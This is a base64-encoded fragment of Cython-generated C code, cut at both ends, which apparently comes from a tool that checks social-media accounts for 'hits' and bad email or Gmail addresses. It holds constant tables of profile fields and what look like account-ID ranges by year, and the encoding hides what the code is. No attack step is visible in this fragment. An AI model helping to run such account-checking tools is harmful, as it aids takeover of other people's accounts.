HVwbGVbNV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZm9sbG93ZXJfY291bnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSkpIF9fUFlYX0VSUigwLCAxNjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdID0gUHlTbGljZV9OZXcoUHlfTm9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE2LCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSkpIF9fUFlYX0VSUigwLCAxODYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzddID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pKSBfX1BZWF9FUlIoMCwgMjY0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGssIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTl9BKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSkpIF9fUFlYX0VSUigwLCAzMDIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mdWxsX25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTl9BKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs5XSkpIF9fUFlYX0VSUigwLCAzMDMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs5XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs5XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZm9sbG93aW5nX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTBdKSkgX19QWVhfRVJSKDAsIDMwNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMF0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21lZGlhX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTFdKSkgX19QWVhfRVJSKDAsIDMwNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzExXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX3ByaXZhdGUsIFB5X0ZhbHNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0pKSBfX1BZWF9FUlIoMCwgMzA3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTJdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEyXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEzXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmlvZ3JhcGh5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05fQSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTNdKSkgX19QWVhfRVJSKDAsIDMwOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEzXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxM10pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX3ZlcmlmaWVkLCBQeV9GYWxzZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTRdKSkgX19QWVhfRVJSKDAsIDMwOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE0XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNF0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE1MCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzk5OSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE1XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEzMDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE2XSkpIF9fUFlYX0VSUigwLCAzODAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10pKSBfX1BZWF9FUlIoMCwgMzgxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE3XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE4XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOTk5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0pKSBfX1BZWF9FUlIoMCwgMzg0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMThdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE4XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE5XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOV0pKSBfX1BZWF9FUlIoMCwgNDExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE5XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIwXSA9IFB5VHVwbGVfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0cyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjBdKSkgX19QWVhfRVJSKDAsIDQyOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIwXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMV0gPSBQeVR1cGxlX1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9nbSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjFdKSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0gPSBQeVR1cGxlX1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9tYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0pKSBfX1BZWF9FUlIoMCwgNDMyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjJdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIyXSk7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAtMTsKfQoKCnN0YXRpYyBpbnQgX19QeXhfSW5pdENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fcHl4X21zdGF0ZS0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AudHlwZSA9IChQeU9iamVjdCopJlB5RGljdF9UeXBlOwogIF9fcHl4X21zdGF0ZS0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AubWV0aG9kX25hbWUgPSAmX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcG9wOwogIGlmIChfX1B5eF9Jbml0U3RyaW5ncyhfX3B5eF9zdHJpbmdfdGFiLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3N0cmluZ190YWIsIF9fcHl4X3N0cmluZ190YWJfZW5jb2RpbmdzKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcik7CiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMCA9IFB5TG9uZ19Gcm9tTG9uZygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8wKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEgPSBQeUxvbmdfRnJvbUxvbmcoMSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yID0gUHlMb25nX0Zyb21Mb25nKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMyA9IFB5TG9uZ19Gcm9tTG9uZygzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzYgPSBQeUxvbmdfRnJvbUxvbmcoNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85ID0gUHlMb25nX0Zyb21Mb25nKDkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAgPSBQeUxvbmdfRnJvbUxvbmcoMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1ID0gUHlMb25nX0Zyb21Mb25nKDE1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNiA9IFB5TG9uZ19Gcm9tTG9uZygxNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMzAgPSBQeUxvbmdfRnJvbUxvbmcoMzApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMyID0gUHlMb25nX0Zyb21Mb25nKDMyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zMikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTExID0gUHlMb25nX0Zyb21Mb25nKDExMSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTExKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1MCA9IFB5TG9uZ19Gcm9tTG9uZygxNTApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1MCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDAgPSBQeUxvbmdfRnJvbUxvbmcoMjAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTk5ID0gUHlMb25nX0Zyb21Mb25nKDk5OSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTk5KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEzMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTMwMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTMwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDAwID0gUHlMb25nX0Zyb21Mb25nKDIwMDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMCA9IFB5TG9uZ19Gcm9tTG9uZygyMDEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTEgPSBQeUxvbmdfRnJvbUxvbmcoMjAxMSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEyID0gUHlMb25nX0Zyb21Mb25nKDIwMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTIpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMyA9IFB5TG9uZ19Gcm9tTG9uZygyMDEzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTQgPSBQeUxvbmdfRnJvbUxvbmcoMjAxNCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE1ID0gUHlMb25nX0Zyb21Mb25nKDIwMTUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNiA9IFB5TG9uZ19Gcm9tTG9uZygyMDE2KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE2KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTcgPSBQeUxvbmdfRnJvbUxvbmcoMjAxNyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE4ID0gUHlMb25nX0Zyb21Mb25nKDIwMTgpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTgpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxOSA9IFB5TG9uZ19Gcm9tTG9uZygyMDE5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE5KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEyNzkwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTI3OTAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEyNzkwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSA9IFB5TG9uZ19Gcm9tTG9uZygxMjc5MDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxNzc1MDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAxID0gUHlMb25nX0Zyb21Mb25nKDE3NzUwMDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAwID0gUHlMb25nX0Zyb21Mb25nKDI3OTc2MDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDEgPSBQeUxvbmdfRnJvbUxvbmcoMjc5NzYwMDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMCA9IFB5TG9uZ19Gcm9tTG9uZyg5MDA5OTAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAxID0gUHlMb25nX0Zyb21Mb25nKDkwMDk5MDAwMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwID0gUHlMb25nX0Zyb21Mb25nKDE2MjkwMTAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE5MDAwMDAwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTkwMDAwMDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE5MDAwMDAwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyNTAwMDAwMDAwIiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2ID0gUHlMb25nX0Zyb21TdHJpbmcoIjM3MTM2Njg3ODYiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzU2OTk3ODUyMTcgPSBQeUxvbmdf